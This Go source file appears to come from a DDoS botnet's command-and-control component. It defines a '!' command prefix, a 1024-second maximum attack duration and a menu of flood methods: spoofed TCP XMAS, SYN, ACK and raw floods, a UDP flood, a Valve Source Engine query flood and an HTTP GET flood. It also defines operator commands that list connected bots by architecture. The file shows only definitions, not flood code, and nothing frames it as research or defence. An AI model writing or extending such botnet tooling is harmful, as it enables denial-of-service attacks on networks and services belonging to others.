package domain

// [prefix][command]
//
// example
//
// !xmas [args]
const PREFIX = "!"

const MAX_DURATION = 1024 // in seconds

type Method struct {
	Name        string // without prefix
	Description string
	Layer       string // L4 or L7
}

type Command struct {
	Name        string
	Description string
	Handler     func(args []string)
}

var MethodsMap = map[uint8]Method{
	0: {
		Name:        "xmas",
		Description: "TCP packets with all flags set (spoofed)",
		Layer:       "L4",
	},
	1: {
		Name:        "udp",
		Description: "UDP flood (unspoofed)",
		Layer:       "L4",
	},
	2: {
		Name:        "syn",
		Description: "TCP SYN flood (spoofed)",
		Layer:       "L4",
	},
	3: {
		Name:        "ack",
		Description: "TCP ACK flood (spoofed)",
		Layer:       "L4",
	},
	4: {
		Name:        "vse",
		Description: "Valve Source Engine query flood",
		Layer:       "L4",
	},
	5: {
		Name:        "raw",
		Description: "Raw socket flood with random payload (spoofed)",
		Layer:       "L4",
	},
	6: {
		Name:        "http",
		Description: "HTTP GET flood with random user-agents",
		Layer:       "L7",
	},
}

var CommandsMap = map[uint8]Command{
	0: {
		Name:        "bots",
		Description: "shows connected bot count by arch",
	},
	1: {
		Name:        "methods",
		Description: "shows available attack methods",
	},
	2: {
		Name:        "help",
		Description: "shows available commands",
	},
}
